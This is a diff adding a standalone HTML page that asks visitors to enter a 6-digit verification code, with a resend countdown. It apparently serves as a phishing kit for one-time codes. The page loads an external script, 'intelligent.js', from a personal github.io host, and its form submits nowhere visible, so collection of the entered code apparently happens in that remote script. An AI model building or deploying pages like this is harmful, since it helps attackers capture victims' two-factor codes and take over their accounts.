@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verify Code</title>
+
+<style>
+:root{
+  --bg:#071024;
+  --card:#0b1220;
+  --text:#e6eef6;
+  --muted:#94a3b8;
+  --accent:#06b6d4;
+}
+
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:Inter,system-ui,Segoe UI,Roboto,Arial;
+  background:linear-gradient(180deg,#071024,#071b2b);
+  color:var(--text);
+  padding:20px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:linear-gradient(180deg,rgba(255,255,255,.03),rgba(255,255,255,.01));
+  border-radius:16px;
+  padding:26px;
+  box-shadow:0 20px 60px rgba(0,0,0,.6);
+  text-align:center;
+}
+
+h2{margin:0 0 8px}
+p{margin:0 0 20px;font-size:14px;color:var(--muted)}
+
+input{
+  width:100%;
+  height:56px;
+  text-align:center;
+  font-size:24px;
+  font-weight:700;
+  letter-spacing:6px;
+  border-radius:14px;
+  border:1px solid rgba(255,255,255,.08);
+  background:rgba(255,255,255,.04);
+  color:var(--text);
+}
+
+input:focus{
+  outline:2px solid rgba(6,182,212,.4);
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  font-size:16px;
+  font-weight:700;
+  cursor:pointer;
+  background:linear-gradient(180deg,var(--accent),#0aa5bd);
+  color:#022;
+  margin-top:16px;
+}
+
+button.secondary{
+  background:transparent;
+  border:1px solid rgba(255,255,255,.1);
+  color:var(--muted);
+}
+
+button:disabled{
+  opacity:.5;
+  cursor:not-allowed;
+}
+</style>
+</head>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<body>
+
+<div class="card">
+  <h2>Verification Code</h2>
+  <p>Enter the 6-digit code sent to you</p>
+
+  <!-- REAL SUBMIT FORM -->
+  <form id="verifyForm" action="#" method="post">
+    <input
+      type="text"
+      name="verification_code"
+      id="verification_code"
+      maxlength="20"
+      inputmode="numeric"
+      placeholder="••••••"
+      required
+    >
+
+    <button type="submit" id="verifyBtn" disabled>
+      Verify Code
+    </button>
+  </form>
+
+  <button class="secondary" id="resendBtn" disabled>
+    Resend code (30s)
+  </button>
+</div>
+
+<script>
+const input = document.getElementById("verification_code");
+const verifyBtn = document.getElementById("verifyBtn");
+const resendBtn = document.getElementById("resendBtn");
+
+let countdown = 30;
+let timer = null;
+
+// enable submit when typing
+input.addEventListener("input", () => {
+  input.value = input.value.replace(/\D/g, "").slice(0,6);
+  verifyBtn.disabled = input.value.length === 0;
+});
+
+// resend countdown
+function startResendTimer(){
+  resendBtn.disabled = true;
+  countdown = 30;
+  resendBtn.textContent = `Resend code (${countdown}s)`;
+
+  timer = setInterval(() => {
+    countdown--;
+    resendBtn.textContent = `Resend code (${countdown}s)`;
+
+    if(countdown <= 0){
+      clearInterval(timer);
+      resendBtn.disabled = false;
+      resendBtn.textContent = "Resend code";
+    }
+  }, 1000);
+}
+
+resendBtn.onclick = () => {
+  input.value = "";
+  verifyBtn.disabled = true;
+  startResendTimer();
+};
+
+startResendTimer();
+</script>
+
+</body>
+</html>
